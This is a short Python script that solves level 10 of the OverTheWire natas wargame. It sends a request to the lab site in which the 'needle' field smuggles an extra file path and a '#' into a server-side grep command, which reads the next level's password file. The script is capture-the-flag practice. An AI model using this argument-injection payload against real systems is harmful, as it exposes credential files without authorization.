"""
Help script to resolve natas challenge #10
"""
import requests
import json

level = 'natas10'
url = 'http://{}.natas.labs.overthewire.org'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
Same as the previous level, but now some characters are filtered out.
From the source code we know that in the end the following command is executed:

    grep -i $key dictionary.txt
 
The grep manpage says:

    The grep utility searches any given input files

Since spaces are not filtered, we can pass a list of files.
"""

# The pattern we send must be in the password. Just match any character with a point.
# Luckily the hash symbol is not filtered out, so we can use it to "comment" dictionary.txt
response = requests.post(url, auth=auth, data={'needle': '. /etc/natas_webpass/natas11 #'})
print(response.text)
